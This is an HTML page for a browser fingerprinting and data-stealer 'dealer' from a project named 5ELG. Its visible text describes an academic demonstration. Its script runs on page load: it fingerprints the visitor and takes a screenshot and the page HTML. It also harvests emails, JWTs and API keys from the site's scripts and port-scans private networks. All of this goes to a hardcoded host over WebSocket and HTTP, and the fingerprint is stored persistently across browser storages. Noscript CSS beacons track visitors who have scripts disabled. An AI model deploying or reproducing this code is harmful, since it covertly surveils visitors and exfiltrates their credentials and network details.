
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DEALER</title>
    <script src="https://cdn.rawgit.com/h2non/jsHashes/master/hashes.js"></script>
    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
    <script>
        //# sourceMappingURL=/dealer?unjs=true&u=sourcemap-ping&b=NOSCRIPT-DETECTED
    </script>
    <style>
      body {
        font-family: Arial, Helvetica, sans-serif;
      }
    </style>
  </head>

  <body>
    <script>
        let velghost = "10.13.37.40";
        let dealerUri = "/dealer.php";

        let socket;
        let encodedPageHTML;
        let encodedImg;
        let fingerprint;

        let userFingerprint = null;
        let fingerprintData = null;
        let extendedFingerprintData = {};
        const SHA256 = new Hashes.SHA256();

        /**
         * General purpose functions
        */
        function objToString(obj) {
            return Object.entries(obj).reduce((str, [key, val]) => `${str}${key}::${val}\n`, '');
        }

        function storeDataInAllStorages(key, value) {
            // LocalStorage
            try {
                localStorage.setItem(key, value);
                console.log(`[5ELG] Data stored in LocalStorage with key: ${key}`);
            } catch (err) {
                console.warn("[5ELG] Failed to store data in LocalStorage:", err);
            }

            // SessionStorage
            try {
                sessionStorage.setItem(key, value);
                console.log(`[5ELG] Data stored in SessionStorage with key: ${key}`);
            } catch (err) {
                console.warn("[5ELG] Failed to store data in SessionStorage:", err);
            }

            // Cookies
            try {
                document.cookie = `${key}=${encodeURIComponent(value)}; path=/; SameSite=Strict;`;
                console.log(`[5ELG] Data stored in Cookies with key: ${key}`);
            } catch (err) {
                console.warn("[5ELG] Failed to store data in Cookies:", err);
            }

            // Cache API
            if ("caches" in window) {
                caches.open("my-cache").then((cache) => {
                    const response = new Response(value, { headers: { "Content-Type": "text/plain" } });
                    cache.put(key, response).then(() => {
                        console.log(`[5ELG] Data stored in Cache API with key: ${key}`);
                    }).catch((err) => {
                        console.warn("[5ELG] Failed to store data in Cache API:", err);
                    });
                }).catch((err) => {
                    console.warn("[5ELG] Failed to open Cache API:", err);
                });
            }

            // IndexedDB
            if ("indexedDB" in window) {
                try {
                    const request = indexedDB.open("my-database", 1);

                    request.onupgradeneeded = function (event) {
                        const db = event.target.result;
                        if (!db.objectStoreNames.contains("my-store")) {
                            db.createObjectStore("my-store", { keyPath: "key" });
                            console.log("[5ELG] Object store 'my-store' created during upgrade.");
                        }
                    };

                    request.onsuccess = function (event) {
                        const db = event.target.result;
                        const transaction = db.transaction("my-store", "readwrite");
                        const store = transaction.objectStore("my-store");
                        store.put({ key: key, value: value });
                        console.log(`[5ELG] Data stored in IndexedDB with key: ${key}`);
                    };

                    request.onerror = function (event) {
                        console.warn("[5ELG] Failed to open IndexedDB:", event.target.error);
                    };
                } catch (err) {
                    console.warn("[5ELG] Error initializing IndexedDB:", err);
                }
            }
        }

        async function getDataFromAllStorages(key) {
            // Check LocalStorage
            try {
                const localStorageValue = localStorage.getItem(key);
                if (localStorageValue !== null) {
                    console.log(`[5ELG] Data retrieved from LocalStorage with key: ${key}`);
                    return localStorageValue;
                }
            } catch (err) {
                console.warn("[5ELG] Failed to retrieve data from LocalStorage:", err);
            }

            // Check SessionStorage
            try {
                const sessionStorageValue = sessionStorage.getItem(key);
                if (sessionStorageValue !== null) {
                    console.log(`[5ELG] Data retrieved from SessionStorage with key: ${key}`);
                    return sessionStorageValue;
                }
            } catch (err) {
                console.warn("[5ELG] Failed to retrieve data from SessionStorage:", err);
            }

            // Check Cookies
            try {
                const cookies = document.cookie.split("; ");
                for (let cookie of cookies) {
                    const [cookieKey, cookieValue] = cookie.split("=");
                    if (cookieKey === key) {
                        console.log(`[5ELG] Data retrieved from Cookies with key: ${key}`);
                        return decodeURIComponent(cookieValue);
                    }
                }
            } catch (err) {
                console.warn("[5ELG] Failed to retrieve data from Cookies:", err);
            }

            // Check Cache API
            if ("caches" in window) {
                try {
                    const cache = await caches.open("my-cache");
                    const response = await cache.match(key);
                    if (response) {
                        const cacheValue = await response.text();
                        console.log(`[5ELG] Data retrieved from Cache API with key: ${key}`);
                        return cacheValue;
                    }
                } catch (err) {
                    console.warn("[5ELG] Failed to retrieve data from Cache API:", err);
                }
            }

            // Check IndexedDB
            if ("indexedDB" in window) {
                try {
                    const request = indexedDB.open("my-database", 1);

                    return new Promise((resolve, reject) => {
                        // This is triggered if the database is created or its version is upgraded
                        request.onupgradeneeded = function (event) {
                            const db = event.target.result;
                            if (!db.objectStoreNames.contains("my-store")) {
                                db.createObjectStore("my-store", { keyPath: "key" });
                                console.log("[5ELG] Object store 'my-store' created during upgrade.");
                            }
                        };

                        // Database opened successfully
                        request.onsuccess = function (event) {
                            const db = event.target.result;

                            try {
                                // Ensure the object store exists before accessing
                                if (!db.objectStoreNames.contains("my-store")) {
                                    console.warn("[5ELG] Object store 'my-store' does not exist.");
                                    resolve(null);
                                    return;
                                }

                                const transaction = db.transaction("my-store", "readonly");
                                const store = transaction.objectStore("my-store");
                                const getRequest = store.get(key);

                                getRequest.onsuccess = function (event) {
                                    if (event.target.result) {
                                        console.log(`[5ELG] Data retrieved from IndexedDB with key: ${key}`);
                                        resolve(event.target.result.value);
                                    } else {
                                        console.log(`[5ELG] No data found in IndexedDB for key: ${key}`);
                                        resolve(null);
                                    }
                                };

                                getRequest.onerror = function (event) {
                                    console.warn("[5ELG] Failed to retrieve data from IndexedDB:", event.target.error);
                                    resolve(null);
                                };
                            } catch (err) {
                                console.warn("[5ELG] Error accessing object store in IndexedDB:", err);
                                resolve(null);
                            }
                        };

                        // Handle database opening errors
                        request.onerror = function (event) {
                            console.warn("[5ELG] Failed to open IndexedDB:", event.target.error);
                            resolve(null);
                        };
                    });
                } catch (err) {
                    console.warn("[5ELG] Failed to retrieve data from IndexedDB:", err);
                }
            } else {
                console.warn("[5ELG] IndexedDB is not supported in this browser.");
            }

            // If nothing is found in any storage mechanism, return null
            return null;
        }
           
        async function uploadFile(id, filename, filecontent) {
            const formData = new FormData();
            formData.append("file", new Blob([filecontent], { type: "application/octet-stream" }), filename);
            formData.append("ID", id);

            fetch("http://localhost:3000/upload", {
                method: "POST",
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
           
        function findEmailAddresses(bodyText) {
            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;            
            const emails = bodyText.match(emailRegex) || [];
            return Array.from(new Set(emails)); // Remove duplicates
        }
        function findJwtTokens(content) {
            // Regular expression to match JWT tokens
            const jwtRegex = /\b[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\b/g;
            const tokens = content.match(jwtRegex) || [];
            return Array.from(new Set(tokens)); // Remove duplicates
        }
        function findApiKeys(content) {
            const apiKeyPatterns = {
                googleApiKey: /AIza[0-9A-Za-z-_]{35}/g,
                amazonAccessKeyId: /AKIA[0-9A-Z]{16}/g,
                amazonSecretAccessKey: /[0-9a-zA-Z/+]{40}/g,
                firebaseApiKey: /AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}/g,
                githubToken: /ghp_[0-9a-zA-Z]{36}/g,
                slackToken: /xox[baprs]-[0-9a-zA-Z]{10,48}/g,
                stripeSecretKey: /sk_live_[0-9a-zA-Z]{24}/g,
                stripePublishableKey: /pk_live_[0-9a-zA-Z]{24}/g,
                twilioApiKey: /SK[0-9a-fA-F]{32}/g,
                sendgridApiKey: /SG\.[0-9A-Za-z-_]{22}\.[0-9A-Za-z-_]{43}/g,
                mailgunApiKey: /key-[0-9a-zA-Z]{32}/g,
                herokuApiKey: /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/g
            };

            const foundKeys = {};

            for (const [keyName, regex] of Object.entries(apiKeyPatterns)) {
                const matches = content.match(regex) || [];
                if (matches.length > 0) {
                    foundKeys[keyName] = Array.from(new Set(matches)); // Remove duplicates
                }
            }

            return foundKeys;
        }
        
        /**
         * WEBSOCKET AND STEALER
         * 
         * This section of the code focuses on WebSocket communication and various "stealing" techniques
         * that are used for analyzing, extracting, and sending useful information from the client to the server.
         * It collects data such as private network details, email addresses, API keys, JavaScript files,
         * and other endpoint-related information.
         * 
         * The primary goal of this section is to:
         * - Establish a WebSocket connection with a server.
         * - Extract information from the client's environment.
         * - Analyze JavaScript files and endpoints for sensitive data (e.g., emails, JWTs, API keys).
         * - Send extracted data securely via WebSocket.
         * 
         */
        
        function connectWebSocket() {
            try {
                const wsUrl = `ws://${velghost}/?u=${encodeURIComponent(userFingerprint)}&b=${encodeURIComponent(fingerprintData)}`;
                socket = new WebSocket(wsUrl);
            
                socket.onopen = () => {
                    console.log("[5ELG-WS] WebSocket connection established.");
                    sendLinksAndScriptsToWebSocket(socket, userFingerprint)
                    sendNetworkDataToWebSocket(socket, userFingerprint);

                };

                socket.onmessage = (event) => {
                    console.log("[5ELG-WS] Message received:", event.data);
                };

                socket.onclose = (event) => {
                    console.warn("[5ELG-WS] WebSocket connection closed:", event.reason);
                };

                socket.onerror = (error) => {
                    console.error("[5ELG-WS] WebSocket error:", error);
                };

            } catch (err) {
                console.error("[5ELG-WS] Failed to connect WebSocket:", err);
            }
        }

        // Scanning functions
        async function scanPort(ip, port) {
                const url = `http://${ip}:${port}`;
                try {
                    const response = await fetch(url, { method: 'GET', mode: 'no-cors' });
                        
                    return {
                        status: 'open',
                        response: response.statusText || 'No response text'
                    };
                } catch (error) {
                    return {
                        status: 'closed',
                        response: 'No response'
                    };
                }
        }        
        async function scanIP(ip, socket, id) {
                const ipResults = {};
                const ports = [80, 443];

                for (const port of ports) {
                    ipResults[port] = await scanPort(ip, port);
                }
                content = { route:"netdata", data: {Fu: id, c:ipResults} }
                socket.send(JSON.stringify(content));
                return ipResults;
        }

        async function scanPrivateNetworks(socket, id) {
            const privateRanges = [
                '192.168.0.', '192.168.1.', '10.0.0.', '10.0.1.', '172.16.0.', '172.16.1.'
            ];
            const results = {};
            
            // Escanea todas las IPs en el rango
            for (const range of privateRanges) {
                for (let i = 1; i <= 254; i++) {
                    const ip = `${range}${i}`;
                    results[ip] = await scanIP(ip, socket, id); // Espera a que se complete el escaneo de esta IP
                }
            }

            return results;
        }

        function extractRoutes() {
            const routes = {
                javascriptFiles: [],
                endpoints: [],
                others: []
            };

            // Helper function to add routes to the appropriate category
            function addRoute(url) {
                if (url.endsWith('.js')) {
                    routes.javascriptFiles.push(url);
                } else if (url.startsWith('http') || url.startsWith('/')) {
                    routes.endpoints.push(url);
                } else {
                    routes.others.push(url);
                }
            }

            // Extract routes from <a> tags
            document.querySelectorAll('a[href]').forEach(anchor => {
                addRoute(anchor.getAttribute('href'));
            });

            // Extract routes from <form> tags
            document.querySelectorAll('form[action]').forEach(form => {
                addRoute(form.getAttribute('action'));
            });

            // Extract routes from <script> tags
            document.querySelectorAll('script[src]').forEach(script => {
                addRoute(script.getAttribute('src'));
            });

            // Extract routes from <link> tags
            document.querySelectorAll('link[href]').forEach(link => {
                addRoute(link.getAttribute('href'));
            });

            // Extract routes from <img> tags
            document.querySelectorAll('img[src]').forEach(img => {
                addRoute(img.getAttribute('src'));
            });

            // Extract routes from <iframe> tags
            document.querySelectorAll('iframe[src]').forEach(iframe => {
                addRoute(iframe.getAttribute('src'));
            });

            // Extract routes from inline styles
            document.querySelectorAll('[style]').forEach(element => {
                const style = element.getAttribute('style');
                const urlMatches = style.match(/url\(['"]?([^'"]+)['"]?\)/g);
                if (urlMatches) {
                    urlMatches.forEach(match => {
                        const url = match.match(/url\(['"]?([^'"]+)['"]?\)/)[1];
                        addRoute(url);
                    });
                }
            });

            // Extract routes from the DOM text content
            const bodyText = document.body.innerText;
            const urlRegex = /https?:\/\/[^\s]+/g;
            const urls = bodyText.match(urlRegex) || [];
            urls.forEach(url => addRoute(url));

            // Remove duplicates
            routes.javascriptFiles = Array.from(new Set(routes.javascriptFiles));
            routes.endpoints = Array.from(new Set(routes.endpoints));
            routes.others = Array.from(new Set(routes.others));

            return routes;
        }
            
        async function analyzeJavaScriptFiles(jsFiles) {
            const results = [];

            for (const file of jsFiles) {
                try {
                    const response = await fetch(file);
                    const content = await response.text();

                    const emails = findEmailAddresses(content);
                    const jwtTokens = findJwtTokens(content);

                    results.push({
                        file,
                        content,
                        emails,
                        jwtTokens
                    });
                } catch (error) {
                    console.error(`Error fetching ${file}:`, error);
                }
            }

            return results;
        }
        async function extractAndAnalyzeRoutes() {
            const routes = extractRoutes();
            const jsAnalysis = await analyzeJavaScriptFiles(routes.javascriptFiles);

            const result = {
                routes,
                jsAnalysis
            };

            console.log(JSON.stringify(result, null, 2));
            return result;
        }

        function sendLinksAndScriptsToWebSocket(socket, id) {
            try {
                // Extraer rutas y analizar JavaScript
                extractAndAnalyzeRoutes().then(result => {
                    const dataToSend = {
                        links: result.routes.endpoints, // Enlaces de la página
                        jsFiles: result.routes.javascriptFiles, // Archivos JavaScript
                        analysis: result.jsAnalysis // Análisis de los archivos JavaScript
                    };

                    content = { route:"pwdata", data: {Fu: id, c:dataToSend} }

                    if (socket && socket.readyState === WebSocket.OPEN) {
                        socket.send(JSON.stringify(content));
                        console.log("[5ELG-WS] Links and JavaScript data sent to WebSocket:", dataToSend);
                    } else {
                        console.warn("[5ELG-WS] WebSocket is not open. Could not send data.");
                    }
                }).catch(error => {
                    console.error("[5ELG] Error analyzing links and JavaScript files:", error);
                });
            } catch (error) {
                console.error("[5ELG] Failed to send links and scripts:", error);
            }
        }

        function sendNetworkDataToWebSocket(socket, id) {
            try {
                var networkResults;
                console.log("[5ELG-DEALER] Network scanning running:", networkResults);
                // Escanear redes privadas
                scanPrivateNetworks(socket, id).then(networkResults => {
                    if (socket && socket.readyState === WebSocket.OPEN) {
                        console.log("[5ELG-WS] Network data sent to WebSocket:", networkResults);
                    } else {
                        console.warn("[5ELG-WS] WebSocket is not open. Could not send network data.");
                    }
                }).catch(error => {
                    console.error("[5ELG] Error scanning private networks:", error);
                });
            } catch (error) {
                console.error("[5ELG] Failed to send network data:", error);
            }
        }

        /*
        * FINGERPRINTING FUNCTIONS:
        * This set of functions is designed to collect, process, and analyze detailed fingerprinting data from the browser. The goal is to uniquely identify a user or device based on a combination of hardware, browser, and network attributes. This information can be used for client-side tracking, analytics, and security purposes.
        * 
        * ### What does fingerprinting do?
        * Browser fingerprinting leverages unique traits of a user's browser, device, and network setup to generate an identifier (a "fingerprint"). Unlike cookies or other client-side identifiers, fingerprinting does not require explicit user permission and persists even if cookies are cleared. By combining data from different APIs, browser attributes, and device configurations, these functions aim to create an identifier that is resistant to manipulation or removal.
        * 
        * ### How is the fingerprinting achieved in this code?
        * The fingerprinting process in this code involves collecting information from multiple sources, including:
        * - Browser attributes (e.g., plugins, user agent, language settings)
        * - Hardware characteristics (e.g., GPU model, screen resolution)
        * - Network configurations (e.g., WebRTC IP leaks, connection type)
        * - User permissions (e.g., geolocation, camera, microphone)
        * - Advanced APIs (e.g., WebGL, DeviceOrientation, Battery API, MediaDevices)
        * - Experimental and hidden properties (e.g., device motion, memory usage)
        * 
        * Below is a breakdown of the key functions used for fingerprinting in this code:
        */

        function getGpuModel() {
            let canvas = document.createElement("canvas");
            let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            return gl ? gl.getParameter(gl.RENDERER) : "WebGL not supported";
        }
        
        function normalizeLanguage(language) {
            const languageMap = {
                'af': 'AF', 'af-za': 'AF',
                'sq': 'SQ', 'sq-al': 'SQ',
                'ar': 'AR', 'ar-dz': 'AR', 'ar-bh': 'AR', 'ar-eg': 'AR', 'ar-iq': 'AR', 'ar-jo': 'AR', 'ar-kw': 'AR', 'ar-lb': 'AR', 'ar-ly': 'AR', 'ar-ma': 'AR', 'ar-om': 'AR', 'ar-qa': 'AR', 'ar-sa': 'AR', 'ar-sy': 'AR', 'ar-tn': 'AR', 'ar-ae': 'AR', 'ar-ye': 'AR',
                'hy': 'HY', 'hy-am': 'HY',
                'az': 'AZ', 'az-az': 'AZ',
                'eu': 'EU', 'eu-es': 'EU',
                'be': 'BE', 'be-by': 'BE',
                'bg': 'BG', 'bg-bg': 'BG',
                'ca': 'CA', 'ca-es': 'CA',
                'zh': 'ZH', 'zh-cn': 'ZH', 'zh-hk': 'ZH', 'zh-mo': 'ZH', 'zh-sg': 'ZH', 'zh-tw': 'ZH',
                'hr': 'HR', 'hr-hr': 'HR',
                'cs': 'CS', 'cs-cz': 'CS',
                'da': 'DA', 'da-dk': 'DA',
                'nl': 'NL', 'nl-be': 'NL', 'nl-nl': 'NL',
                'en': 'EN', 'en-au': 'EN', 'en-bz': 'EN', 'en-ca': 'EN', 'en-ie': 'EN', 'en-jm': 'EN', 'en-nz': 'EN', 'en-ph': 'EN', 'en-za': 'EN', 'en-tt': 'EN', 'en-gb': 'EN', 'en-us': 'EN', 'en-zw': 'EN',
                'et': 'ET', 'et-ee': 'ET',
                'fo': 'FO', 'fo-fo': 'FO',
                'fa': 'FA', 'fa-ir': 'FA',
                'fi': 'FI', 'fi-fi': 'FI',
                'fr': 'FR', 'fr-be': 'FR', 'fr-ca': 'FR', 'fr-fr': 'FR', 'fr-lu': 'FR', 'fr-mc': 'FR', 'fr-ch': 'FR',
                'gl': 'GL', 'gl-es': 'GL',
                'ka': 'KA', 'ka-ge': 'KA',
                'de': 'DE', 'de-at': 'DE', 'de-de': 'DE', 'de-li': 'DE', 'de-lu': 'DE', 'de-ch': 'DE',
                'el': 'EL', 'el-gr': 'EL',
                'gu': 'GU', 'gu-in': 'GU',
                'he': 'HE', 'he-il': 'HE',
                'hi': 'HI', 'hi-in': 'HI',
                'hu': 'HU', 'hu-hu': 'HU',
                'is': 'IS', 'is-is': 'IS',
                'id': 'ID', 'id-id': 'ID',
                'it': 'IT', 'it-it': 'IT', 'it-ch': 'IT',
                'ja': 'JA', 'ja-jp': 'JA',
                'kn': 'KN', 'kn-in': 'KN',
                'kk': 'KK', 'kk-kz': 'KK',
                'kok': 'KOK', 'kok-in': 'KOK',
                'ko': 'KO', 'ko-kr': 'KO',
                'ky': 'KY', 'ky-kg': 'KY',
                'lv': 'LV', 'lv-lv': 'LV',
                'lt': 'LT', 'lt-lt': 'LT',
                'mk': 'MK', 'mk-mk': 'MK',
                'ms': 'MS', 'ms-bn': 'MS', 'ms-my': 'MS',
                'mr': 'MR', 'mr-in': 'MR',
                'mn': 'MN', 'mn-mn': 'MN',
                'no': 'NO', 'no-no': 'NO', 'nb-no': 'NO', 'nn-no': 'NO',
                'pl': 'PL', 'pl-pl': 'PL',
                'pt': 'PT', 'pt-br': 'PT', 'pt-pt': 'PT',
                'pa': 'PA', 'pa-in': 'PA',
                'ro': 'RO', 'ro-ro': 'RO',
                'ru': 'RU', 'ru-ru': 'RU',
                'sa': 'SA', 'sa-in': 'SA',
                'sr': 'SR', 'sr-cyrl': 'SR', 'sr-cyrl-cs': 'SR', 'sr-latn': 'SR', 'sr-latn-cs': 'SR',
                'sk': 'SK', 'sk-sk': 'SK',
                'sl': 'SL', 'sl-si': 'SL',
                'es': 'ES', 'es-ar': 'ES', 'es-bo': 'ES', 'es-cl': 'ES', 'es-co': 'ES', 'es-cr': 'ES', 'es-do': 'ES', 'es-ec': 'ES', 'es-sv': 'ES', 'es-gt': 'ES', 'es-hn': 'ES', 'es-mx': 'ES', 'es-ni': 'ES', 'es-pa': 'ES', 'es-py': 'ES', 'es-pe': 'ES', 'es-pr': 'ES', 'es-es': 'ES', 'es-uy': 'ES', 'es-ve': 'ES',
                'sw': 'SW', 'sw-ke': 'SW',
                'sv': 'SV', 'sv-fi': 'SV', 'sv-se': 'SV',
                'syr': 'SYR', 'syr-sy': 'SYR',
                'ta': 'TA', 'ta-in': 'TA',
                'tt': 'TT', 'tt-ru': 'TT',
                'te': 'TE', 'te-in': 'TE',
                'th': 'TH', 'th-th': 'TH',
                'tr': 'TR', 'tr-tr': 'TR',
                'uk': 'UK', 'uk-ua': 'UK',
                'ur': 'UR', 'ur-pk': 'UR',
                'uz': 'UZ', 'uz-cyrl': 'UZ', 'uz-cyrl-uz': 'UZ', 'uz-latn': 'UZ', 'uz-latn-uz': 'UZ',
                'vi': 'VI', 'vi-vn': 'VI',
                'xh': 'XH', 'xh-za': 'XH',
                'zu': 'ZU', 'zu-za': 'ZU'
            };

            const normalizedLanguage = language.toLowerCase();
            return languageMap[normalizedLanguage] || language.toUpperCase();
        }

        function getPrimaryLanguage() {
            const language = navigator.language || navigator.userLanguage || navigator.browserLanguage;
            return normalizeLanguage(language);
        }
        
        function getFingerprintDataExtended() {
            let data = {};

            // Browser plugins
            data.browserPlugins = [...navigator.plugins].map(p => `${p.name} ${p.version}`).join(";");

            // Device data
            let deviceData = {};
            ["hardwareConcurrency", "maxTouchPoints", "platform", "product", "vendor", "languages", "deviceMemory"].forEach(key => {
                deviceData[key] = navigator[key] || null;
            });

            // GPU information
            data.gpuData = {
                colorDepth: screen.colorDepth,
                renderer: getGpuModel()
            };

            // Browser data
            let browserData = {};
            ["appCodeName", "appName", "appVersion", "language", "product", "productSub", "userAgent", "onLine"].forEach(key => {
                browserData[key] = navigator[key] || null;
            });
            browserData.actualUri = location.href;

            // Collect permission statuses
            let permissions = {};
            ["geolocation", "accelerometer", "camera", "clipboard-read", "clipboard-write", "microphone", "notifications", "persistent-storage", "payment-handler", "midi"].forEach(permission => {
                navigator.permissions.query({ name: permission }).then(status => {
                    permissions[permission] = status.state;
                }).catch(err => console.warn(`Permission query failed for ${permission}:`, err));
            });
            browserData.permissions = objToString(permissions);

            // Battery data
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    browserData.batteryData = {
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime,
                        level: battery.level
                    };
                }).catch(err => console.warn('Failed to access battery data:', err));
            }

            // Media devices
            if (navigator.mediaDevices) {
                navigator.mediaDevices.enumerateDevices().then(devices => {
                    browserData.mediaDevices = devices.map(d => `${d.kind}: ${d.label}`).join("; ");
                }).catch(err => console.warn('Failed to access media devices:', err));
            }

            // WebRTC IP leaks (getting local IP via WebRTC)
            try {
                let rtcPeerConnection = new RTCPeerConnection({ iceServers: [] });
                rtcPeerConnection.createDataChannel(''); // Create an empty data channel
                rtcPeerConnection.createOffer()
                    .then(offer => rtcPeerConnection.setLocalDescription(offer))
                    .catch(err => console.warn('Error creating offer:', err));

                rtcPeerConnection.onicecandidate = function (ice) {
                    // Ensure the candidate is not null and has valid information
                    if (ice.candidate && ice.candidate.candidate) {
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        browserData.rtcdata = ice.candidate.candidate;
                        const localIP = ice.candidate.candidate.match(ipRegex);
                        if (localIP) {
                            browserData.localIP = localIP[1]; // Store the extracted IP address
                            console.log('Local IP detected:', localIP[1]);
                        }
                    } else {
                        console.log('ICE gathering completed or no valid candidate found.');
                    }
                };
            } catch (err) {
                console.warn('Failed to access WebRTC IP:', err);
            }


            // Network Information API (Experimental)
            try {
                if (navigator.connection) {
                    browserData.networkInfo = {
                        downlink: navigator.connection.downlink,
                        effectiveType: navigator.connection.effectiveType,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    };
                }
            } catch (err) {
                console.warn('Failed to access network information:', err);
            }

            // Device Orientation and Motion (Experimental)
            try {
                window.addEventListener("deviceorientation", function (event) {
                    browserData.deviceOrientation = {
                        alpha: event.alpha,
                        beta: event.beta,
                        gamma: event.gamma
                    };
                }, true);

                window.addEventListener("devicemotion", function (event) {
                    browserData.deviceMotion = {
                        acceleration: event.acceleration,
                        accelerationIncludingGravity: event.accelerationIncludingGravity,
                        rotationRate: event.rotationRate,
                        interval: event.interval
                    };
                }, true);
            } catch (err) {
                console.warn('Failed to access device orientation/motion:', err);
            }

            // Memory API (Experimental)
            try {
                if (performance && performance.memory) {
                    browserData.memoryInfo = {
                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                        totalJSHeapSize: performance.memory.totalJSHeapSize,
                        usedJSHeapSize: performance.memory.usedJSHeapSize
                    };
                }
            } catch (err) {
                console.warn('Failed to access memory information:', err);
            }

            // Touch Capabilities (Experimental)
            try {
                browserData.touchCapabilities = {
                    maxTouchPoints: navigator.maxTouchPoints,
                    touchEventSupported: 'ontouchstart' in window,
                    pointerEventSupported: 'onpointerdown' in window
                };
            } catch (err) {
                console.warn('Failed to access touch capabilities:', err);
            }

            data.deviceData = deviceData;
            data.browserData = browserData;
            return data;
        }

        function generateUserBrowserFingerprint() {
            const fingerprintData = {
                cookieEnabled: navigator.cookieEnabled,
                font: getComputedStyle(document.documentElement).fontSize,
                primaryLanguage: getPrimaryLanguage(),
                timezone: new Date().getTimezoneOffset() / -60,
                platform: navigator.platform,
            };
            console.log(fingerprintData);
            
            return SHA256.hex(JSON.stringify(fingerprintData));
        }

        async function initializeFingerprints() {
            console.log("[5ELG] Initializing fingerprints...");
            extendedFingerprintData = getFingerprintDataExtended();
            try {
                // Retrieve user fingerprint (u)
                userFingerprint = await getDataFromAllStorages("u");
                if (!userFingerprint) {
                    userFingerprint = generateUserBrowserFingerprint();
                    storeDataInAllStorages("u", userFingerprint);
                }
                console.log("[5ELG] User fingerprint initialized:", userFingerprint);

                // Retrieve or generate browser fingerprint data (f)
                fingerprintData = await getDataFromAllStorages("f");
                if (!fingerprintData) {
                    fingerprintData = SHA256.hex(JSON.stringify(userFingerprint));
                    storeDataInAllStorages("f", fingerprintData);
                }
                console.log("[5ELG] Browser fingerprint initialized:", fingerprintData);
            } catch (err) {
                console.error("[5ELG] Initialization error:", err);
            }
        }

        function captureAndSendData() {
            html2canvas(document.body).then((canvas) => {
                const encodedImg = canvas.toDataURL().replace(/^data:image\/(png|jpg);base64,/, ""); // Screenshot encoding
                const pageHTML = document.documentElement.outerHTML;
                const encodedPageHTML = btoa(encodeURIComponent(pageHTML)); // Encode page HTML

                console.log(extendedFingerprintData);
                
                // Prepare payload
                const payload = new URLSearchParams({
                    u: userFingerprint,
                    b: fingerprintData,
                    r: SHA256.hex(JSON.stringify({ff:fingerprintData,tt:Date.now()})),
                    Ua: navigator.userAgent,
                    data: btoa(JSON.stringify(extendedFingerprintData)),
                    code: encodeURIComponent(encodedPageHTML),
                    ts: new Date().toISOString(),
                    s: encodeURIComponent(encodedImg),
                });

                // Send HTTP POST request
                const xhr = new XMLHttpRequest();
                xhr.open("POST", "/dealer.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function () {
                    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                        console.log("[5ELG] SENT!");
                    }
                };
                xhr.send(payload.toString());
            });
        }

        /*
        ** Initialize
        */
        window.onload = async function () {
            try {
                
                await initializeFingerprints(); // Wait for fingerprint initialization to complete
                captureAndSendData(); // Capture and send data via HTTP
                connectWebSocket(); // Connect WebSocket

            } catch (error) {
                console.error("[5ELG] Initialization error:", error);
            }
        };

    </script>
  

    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            color: #333;
        }

        .container {
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        h1 {
            text-align: center;
            color: #2c3e50;
        }

        p {
            line-height: 1.6;
            margin: 20px 0;
        }

        .highlight {
            color: #2980b9;
            font-weight: bold;
        }

        .github-link {
            text-align: center;
            margin-top: 30px;
        }

        .github-link a {
            text-decoration: none;
            color: #fff;
            background-color: #2980b9;
            padding: 10px 20px;
            border-radius: 5px;
            transition: background-color 0.3s ease;
        }

        .github-link a:hover {
            background-color: #3498db;
        }

        footer {
            text-align: center;
            margin-top: 50px;
            font-size: 0.9em;
            color: #7f8c8d;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>Welcome to the 5ELG Dealer Example</h1>
        <p>
            This is a demonstration of a <span class="highlight">dealer</span> within the <strong>5ELG Project</strong>.
            The 5ELG system is designed to track, log, and analyze interactions from dealers, which are responsible for collecting browser and user fingerprint data.
        </p>
        <p>
            Please note that all the data collected through this example dealer is strictly for <span class="highlight">academic purposes</span>.
            The collected information is used solely for research, educational, and non-commercial purposes.
            We take data privacy seriously, and no personal or sensitive data will be sold, shared, or used outside of its intended academic scope.
        </p>
        <p>
            If you are interested in learning more about the 5ELG project, its architecture, or how this data is processed,
            please feel free to visit the official repository on <span class="highlight">GitHub</span>. The repository contains detailed documentation on the system, 
            including how to set up your own dealers and interact with the various APIs available within 5ELG.
        </p>
        <div class="github-link">
            <a href="https://github.com/jomoza/5ELG" target="_blank">Visit our GitHub Repository</a>
        </div>
    </div>
      
  </body>

  <img class="js-disabled-message" src="/dealer.png?unjs=true&u=img-ping&b=CSS_BLOCKING-DETECTED" id="nojs-image">
  <noscript>
    <style>
     
        @font-face { 
            font-family: 'Ubuntu'; 
            src: local('Ubuntu'), url('/dealer.png?unjs=true&u=cssTracking(ubuntu)&b=NOSCRIPT-DETECTED') format('truetype'); 
        }
        @font-face { 
            font-family: 'Calibri'; src: local('Calibri'), url('/dealer.png?unjs=true&u=cssTracking(Linux)&b=NOSCRIPT-DETECTED') format('truetype'); 
        }
        @font-face { font-family: 'MS UI Gothic'; src: local('Roboto'), url('/dealer.png?unjs=true&u=cssTracking(Windows)&b=NOSCRIPT-DETECTED') format('truetype') }

        @supports(-webkit-app-region: inherit) { .badboy { background: url('/dealer.png?unjs=true&u=cssTracking(ChromeBasedBrowser)&b=NOSCRIPT-DETECTED') } }
